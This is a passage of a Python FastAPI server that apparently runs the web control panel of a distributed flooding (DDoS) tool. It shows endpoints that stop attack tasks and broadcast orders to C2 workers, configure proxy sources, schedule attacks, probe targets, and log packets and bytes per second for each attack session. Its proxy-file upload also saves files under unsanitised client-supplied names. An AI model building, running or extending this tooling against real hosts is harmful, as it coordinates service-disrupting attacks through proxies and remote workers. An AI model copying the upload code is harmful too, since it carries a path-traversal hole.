    return StatusResponse(status="success", message="Attack sequence initiated.", recommendation=task_id)

class StopParams(BaseModel):
    task_id: str

@app.post("/api/attack/stop", response_model=StatusResponse)
async def stop_attack(params: StopParams) -> StatusResponse:
    import datetime
    task_id = params.task_id

    # Broadcast stop to workers
    for nid in list(C2.workers.keys()):
        C2.pending_tasks[nid].append({"action": "stop", "task_id": task_id})

    # Cleanup from task_info regardless of process presence to keep UI in sync
    was_tracked = task_id in state.task_info
    target = "Unknown"
    if was_tracked:
        target = state.task_info[task_id].get("target", "Unknown")
        del state.task_info[task_id]

    if task_id not in state.active_tasks:
        # Mark as aborted in DB if it was left running
        await HistoryDB.finalize_session(task_id, 'aborted')
        if was_tracked:
            asyncio.create_task(fire_webhook("Attack Manual Termination", f"Task ID: {task_id}\nTarget: {target} (Already Terminated)"))
            return StatusResponse(status="success", message=f"Task {task_id} cleared from tracking.")
        return StatusResponse(status="error", message=f"No active record found for task {task_id}.")

    process = state.active_tasks[task_id]
    await broadcast_log(json.dumps({"task_id": task_id, "type": "system", "msg": f"[*] INITIATING RECURSIVE TERMINATION FOR TASK {task_id}: Cleaning up process tree..."}))
    try:
        pid = process.pid
        parent = psutil.Process(pid)
        for child in parent.children(recursive=True):
            child.kill()
        parent.kill()

        # Cleanup state immediately
        if task_id in state.active_tasks:
            del state.active_tasks[task_id]

        asyncio.create_task(fire_webhook("Attack Manual Termination", f"Task ID: {task_id}\nTarget: {target}"))

        # Mark as aborted in DB and calculate aggregates
        await HistoryDB.finalize_session(task_id, 'aborted')

        return StatusResponse(status="success", message=f"Task {task_id} terminated.")
    except psutil.NoSuchProcess:
        if task_id in state.active_tasks:
            del state.active_tasks[task_id]

        now = datetime.datetime.now().isoformat()
        await HistoryDB._execute('''
            UPDATE attack_sessions SET exit_status = 'aborted', end_time = ?
            WHERE session_id = ? AND exit_status = 'running'
        ''', (now, task_id))
        return StatusResponse(status="success", message="Process already purged.")
    except Exception as e:
        await broadcast_log(json.dumps({"task_id": task_id, "type": "error", "msg": f"[!] TERMINATION ERROR: {e}"}))
        with contextlib.suppress(Exception):
            process.kill()
        return StatusResponse(status="error", message=str(e))

@app.get("/api/attack/status")
async def get_attack_status() -> dict[str, Any]:
    tasks = []
    now = time.time()

    # Prune stale tasks from info if they are not in active_tasks and not in C2 pending/active (simplified)
    # Actually, we rely on stop_attack and run_attack_subprocess finally block to clean up local tasks.
    # For distributed tasks, we might need a more complex cleanup logic.

    for task_id, info in list(state.task_info.items()):
        elapsed = int(now - info.get("start_time", now))

        # If task is not in active_tasks AND it was a local task (duration > 0 and elapsed > duration + 10)
        # we consider it finished and potentially clean it up here if it missed the finally block
        if task_id not in state.active_tasks and info.get("duration", 0) > 0 and elapsed > info["duration"] + 30:
             del state.task_info[task_id]
             continue

        tasks.append({
            "task_id": task_id,
            "target": info.get("target"),
            "method": info.get("method"),
            "threads": info.get("threads"),
            "duration": info.get("duration"),
            "elapsed": elapsed,
            "status": "running" if task_id in state.active_tasks else "distributed"
        })
    return {"status": "success", "active_tasks": tasks, "max_concurrent": state.max_concurrent}
@app.get("/api/config/proxies")
async def get_proxy_config() -> dict[str, Any]:
    try:
        config = await read_config()
        return {"status": "success", "providers": config.get("proxy-providers", [])}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/config/proxies", response_model=StatusResponse)
async def update_proxy_config(data: UpdateProxyConfig) -> StatusResponse:
    for p in data.providers:
        url_str = p.url.strip()
        if not url_str:
            return StatusResponse(status="error", message="Source path cannot be empty.")
            
        if url_str.startswith("http://") or url_str.startswith("https://"):
            parsed = urlparse(url_str)
            if not parsed.netloc or not parsed.scheme:
                return StatusResponse(status="error", message=f"Invalid URL format: {url_str}")
        else:
            if not url_str.endswith(".txt") and not url_str.endswith(".json"):
                return StatusResponse(status="error", message=f"Local paths must be .txt or .json files: {url_str}")
            
    try:
        config = await read_config()
            
        config["proxy-providers"] = [
            {"type": p.type, "url": p.url.strip(), "timeout": p.timeout} 
            for p in data.providers
        ]
        
        await write_config(config)
            
        return StatusResponse(status="success", message="Proxy sources updated.")
    except Exception as e:
        return StatusResponse(status="error", message=str(e))

# --- UX Enhancement Endpoints ---

@app.post("/api/upload/proxy")
async def upload_proxy_file(file: UploadFile = File(...)):
    try:
        proxies_dir = BASE_DIR / "files" / "proxies"
        proxies_dir.mkdir(parents=True, exist_ok=True)
        file_path = proxies_dir / file.filename
        
        content = await file.read()
        await asyncio.to_thread(file_path.write_bytes, content)
            
        return {"status": "success", "message": f"Saved as {file.filename}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/presets")
async def get_presets():
    try:
        config = await read_config()
        return {"status": "success", "presets": config.get("presets", {})}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/presets")
async def save_preset(data: PresetSaveParams):
    try:
        config = await read_config()
        
        presets = config.get("presets", {})
        presets[data.name] = data.params.model_dump()
        config["presets"] = presets
        
        await write_config(config)
        return {"status": "success", "message": f"Preset '{data.name}' saved."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.delete("/api/presets/{name}")
async def delete_preset(name: str):
    try:
        if not CONFIG_PATH.exists():
            return {"status": "error", "message": "Config not found."}
        config = await read_config()
        
        presets = config.get("presets", {})
        if name in presets:
            del presets[name]
            config["presets"] = presets
            await write_config(config)
            return {"status": "success", "message": f"Preset '{name}' deleted."}
        return {"status": "error", "message": "Preset not found."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/config/notifications")
async def get_notification_config():
    try:
        config = await read_config()
        return {"status": "success", "notifications": config.get("notifications", {})}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/config/notifications")
async def update_notification_config(data: NotificationConfig):
    try:
        config = await read_config()
        config["notifications"] = data.model_dump()
        await write_config(config)
        return {"status": "success", "message": "Notification config updated."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/schedule")
async def get_schedule():
    try:
        config = await read_config()
        return {"status": "success", "schedule": config.get("schedule", {})}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/schedule")
async def save_schedule(data: ScheduleParams):
    try:
        config = await read_config()
        
        schedule = config.get("schedule", {})
        task_id = str(uuid.uuid4())[:8]
        schedule[task_id] = data.model_dump()
        config["schedule"] = schedule
        
        await write_config(config)
        return {"status": "success", "message": f"Task scheduled with ID {task_id}.", "task_id": task_id}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.delete("/api/schedule/{task_id}")
async def delete_schedule(task_id: str):
    try:
        if not CONFIG_PATH.exists():
            return {"status": "error", "message": "Config not found."}
        config = await read_config()
        
        schedule = config.get("schedule", {})
        if task_id in schedule:
            del schedule[task_id]
            config["schedule"] = schedule
            await write_config(config)
            return {"status": "success", "message": f"Scheduled task '{task_id}' deleted."}
        return {"status": "error", "message": "Task not found."}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# --- Tools ---
@app.get("/api/tools/ping")
async def tool_ping(host: str) -> dict[str, Any]:
    from icmplib import ping
    try:
        host = host.replace("http://", "").replace("https://", "").split("/")[0]
        r = ping(host, count=4, interval=0.2)
        return {
            "status": "success",
            "address": r.address,
            "min_rtt": r.min_rtt,
            "avg_rtt": r.avg_rtt,
            "max_rtt": r.max_rtt,
            "packets_sent": r.packets_sent,
            "packets_received": r.packets_received,
            "is_alive": r.is_alive
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/tools/check")
async def tool_check(url: str) -> dict[str, Any]:
    import aiohttp
    if not url.startswith("http"):
        url = f"http://{url}"
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as res:
                return {
                    "status": "success",
                    "status_code": res.status,
                    "online": res.status < 500
                }
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.get("/api/tools/info")
async def tool_info(host: str) -> dict[str, Any]:
    import aiohttp
    host = host.replace("http://", "").replace("https://", "").split("/")[0]
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://ipwhois.app/json/{host}/", timeout=aiohttp.ClientTimeout(total=10)) as res:
                return await res.json()
    except Exception as e:
        return {"status": "error", "message": str(e)}

# --- Attack History API ---
# HistoryDB: lightweight read-only helper for api.py to query intelligence.db
# (IntelligenceDB lives in start.py subprocess — api.py cannot import it directly)
class HistoryDB:
    DB_PATH = str(BASE_DIR / "files" / "intelligence.db")

    @staticmethod
    def _query_sync(sql: str, params: tuple = ()) -> list[dict]:
        try:
            with sqlite3.connect(HistoryDB.DB_PATH, timeout=10.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute(sql, params)
                return [dict(row) for row in cursor.fetchall()]
        except Exception:
            return []

    @staticmethod
    async def _query(sql: str, params: tuple = ()) -> list[dict]:
        return await asyncio.to_thread(HistoryDB._query_sync, sql, params)

    @staticmethod
    async def _query_one(sql: str, params: tuple = ()) -> dict | None:
        rows = await HistoryDB._query(sql, params)
        return rows[0] if rows else None

    @staticmethod
    def _execute_sync(sql: str, params: tuple = ()) -> int:
        try:
            with sqlite3.connect(HistoryDB.DB_PATH, timeout=10.0) as conn:
                cursor = conn.cursor()
                cursor.execute(sql, params)
                conn.commit()
                return cursor.rowcount
        except Exception:
            return 0

    @staticmethod
    async def _execute(sql: str, params: tuple = ()) -> int:
        return await asyncio.to_thread(HistoryDB._execute_sync, sql, params)

    @staticmethod
    async def finalize_session(session_id: str, exit_status: str = 'completed') -> None:
        import datetime
        now = datetime.datetime.now().isoformat()
        
        # Calculate aggregates from recorded metrics
        metrics_agg = await HistoryDB._query_one('''
            SELECT 
                COALESCE(SUM(pps), 0) as total_req,
                COALESCE(SUM(bps), 0) as total_bytes,
                COALESCE(AVG(CASE WHEN latency > 0 THEN latency END), 0.0) as avg_lat,
                COALESCE(MAX(pps), 0) as peak_pps,
                COALESCE(MAX(bps), 0) as peak_bps
            FROM attack_metrics WHERE session_id = ?
        ''', (session_id,))
        
        # Get start time to calculate duration
        session_data = await HistoryDB._query_one('SELECT start_time FROM attack_sessions WHERE session_id = ?', (session_id,))
        duration_actual = 0.0
        if session_data and session_data.get('start_time'):
            try:
                start_dt = datetime.datetime.fromisoformat(session_data['start_time'])
                duration_actual = (datetime.datetime.now() - start_dt).total_seconds()
            except Exception:
                pass
                
        if metrics_agg:
            await HistoryDB._execute('''
                UPDATE attack_sessions SET
                    end_time = ?,
                    exit_status = ?,
                    duration_actual = ?,
                    total_requests = ?,
                    total_bytes = ?,
                    avg_latency = ?,
                    peak_pps = ?,
                    peak_bps = ?
                WHERE session_id = ? AND exit_status = 'running'
            ''', (
                now, 
                exit_status, 
                duration_actual, 
                metrics_agg['total_req'], 
                metrics_agg['total_bytes'], 
                metrics_agg['avg_lat'], 
                metrics_agg['peak_pps'], 
                metrics_agg['peak_bps'], 
                session_id
            ))
        else:
            await HistoryDB._execute('''
                UPDATE attack_sessions SET 
                    exit_status = ?, 
                    end_time = ?,
                    duration_actual = ?
                WHERE session_id = ? AND exit_status = 'running'
            ''', (exit_status, now, duration_actual, session_id))


@app.get("/api/history/sessions")
async def history_list_sessions(page: int = 1, limit: int = 10,
                                  method: str = "", target: str = ""):
    """List attack sessions with pagination and filtering."""
    offset = (page - 1) * limit
    sql = "SELECT * FROM attack_sessions WHERE 1=1"
    params: list = []
    if method:
        sql += " AND method = ?"
        params.append(method.upper())
    if target:
        sql += " AND target LIKE ?"
        params.append(f"%{target}%")
    sql += " ORDER BY start_time DESC LIMIT ? OFFSET ?"
    params.extend([limit, offset])

    sessions = await HistoryDB._query(sql, tuple(params))

    # Get total count for pagination
    count_sql = "SELECT COUNT(*) as total FROM attack_sessions WHERE 1=1"
    count_params: list = []
    if method:
        count_sql += " AND method = ?"
        count_params.append(method.upper())
    if target:
        count_sql += " AND target LIKE ?"
        count_params.append(f"%{target}%")
    total_row = await HistoryDB._query_one(count_sql, tuple(count_params))
    total = total_row["total"] if total_row else 0
    pages = (total + limit - 1) // limit

    return {
        "status": "success", 
        "sessions": sessions, 
        "total": total,
        "pages": pages,
        "page": page,
        "limit": limit
    }


@app.get("/api/history/sessions/{session_id}")
async def history_session_detail(session_id: str):
    """Get full details for a specific session."""
    session = await HistoryDB._query_one(
        "SELECT * FROM attack_sessions WHERE session_id = ?", (session_id,))
    if not session:
        return {"status": "error", "message": "Session not found"}
    return {"status": "success", "session": session}


@app.get("/api/history/sessions/{session_id}/metrics")
async def history_session_metrics(session_id: str):
    """Get time-series metrics for a session."""
    metrics = await HistoryDB._query(
        """SELECT timestamp, pps, bps, latency, cpu_percent, ram_percent
           FROM attack_metrics WHERE session_id = ?
           ORDER BY timestamp ASC""", (session_id,))
    return {"status": "success", "metrics": metrics, "count": len(metrics)}


@app.get("/api/history/sessions/{session_id}/events")
async def history_session_events(session_id: str):
    """Get event log for a session."""
    events = await HistoryDB._query(
        """SELECT timestamp, event_type, message
           FROM attack_events WHERE session_id = ?
           ORDER BY timestamp ASC""", (session_id,))
    return {"status": "success", "events": events}


@app.get("/api/history/stats")
async def history_global_stats():
    """Get global attack statistics."""
    total = await HistoryDB._query_one("SELECT COUNT(*) as c FROM attack_sessions")
    completed = await HistoryDB._query_one(
        "SELECT COUNT(*) as c FROM attack_sessions WHERE exit_status = 'completed'")
    top_method = await HistoryDB._query_one(
        "SELECT method, COUNT(*) as cnt FROM attack_sessions GROUP BY method ORDER BY cnt DESC LIMIT 1")
    agg = await HistoryDB._query_one(
        """SELECT COALESCE(SUM(total_requests), 0) as total_req,
                  COALESCE(SUM(total_bytes), 0) as total_bytes,
                  COALESCE(AVG(duration_actual), 0) as avg_dur
           FROM attack_sessions WHERE exit_status != 'running'""")
    return {
        "status": "success",
        "total_sessions": total["c"] if total else 0,
        "completed_sessions": completed["c"] if completed else 0,
        "top_method": top_method["method"] if top_method else "N/A",
        "lifetime_requests": agg["total_req"] if agg else 0,
        "lifetime_bytes": agg["total_bytes"] if agg else 0,
        "avg_duration": round(agg["avg_dur"], 1) if agg else 0,
    }


@app.get("/api/history/export")
async def history_export(format: str = "json", session_id: str = ""):
    """Export attack history as JSON or CSV."""
    from fastapi.responses import Response

    if session_id:
        sessions = await HistoryDB._query(
            "SELECT * FROM attack_sessions WHERE session_id = ?", (session_id,))
    else:
        sessions = await HistoryDB._query(
            "SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT 1000")

    if format.lower() == "csv":
        if not sessions:
            return Response(content="No data", media_type="text/csv")
        output = io.StringIO()
        writer = csv.DictWriter(output, fieldnames=sessions[0].keys())
        writer.writeheader()
        writer.writerows(sessions)
        return Response(
            content=output.getvalue(),
            media_type="text/csv",
            headers={"Content-Disposition": "attachment; filename=attack_history.csv"}
        )
    else:
        return {"status": "success", "data": sessions}


@app.delete("/api/history/sessions/{session_id}")
async def history_delete_session(session_id: str):
    """Delete a session and all related data."""
    await HistoryDB._execute("DELETE FROM attack_metrics WHERE session_id = ?", (session_id,))
    await HistoryDB._execute("DELETE FROM attack_events WHERE session_id = ?", (session_id,))
    deleted = await HistoryDB._execute("DELETE FROM attack_sessions WHERE session_id = ?", (session_id,))
    if deleted > 0:
        return {"status": "success", "message": "Session deleted"}
    return {"status": "error", "message": "Session not found"}


@app.get("/api/select_file")
async def select_file_dialog() -> dict[str, str]:
    def _open_dialog() -> str:
        root = tk.Tk()
        root.withdraw()
        root.wm_attributes('-topmost', 1)
        file_path = filedialog.askopenfilename(title="Resource Selector", filetypes=(("Text Files", "*.txt"), ("All Files", "*.*")))
        root.destroy()
        return file_path
    
    loop = asyncio.get_event_loop()
    path = await loop.run_in_executor(None, _open_dialog)
    return {"path": path or ""}



@app.get("/api/system/resources")
async def get_system_resources():
    """Get global system resource metrics."""
    try:
        cpu = psutil.cpu_percent(interval=None)
        ram = psutil.virtual_memory().percent
        disk = psutil.disk_usage('/').percent
        net = psutil.net_io_counters()._asdict()
    except Exception:
        cpu, ram, disk, net = 0, 0, 0, {}

    return {
        "status": "success",
        "cpu_percent": cpu,
        "ram_percent": ram,
        "disk_usage": disk,
        "net_io": net,
        "active_tasks": len(state.active_tasks),
    }

@app.websocket("/ws/logs")
async def websocket_endpoint(websocket: WebSocket) -> None:
    await websocket.accept()
    state.connected_websockets.append(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        if websocket in state.connected_websockets:
            state.connected_websockets.remove(websocket)

app.mount("/", StaticFiles(directory=str(BASE_DIR / "web"), html=True), name="web")

def run() -> None:
    uvicorn.run("api:app", host="127.0.0.1", port=8000, log_level="info")

if __name__ == "__main__":
    run()
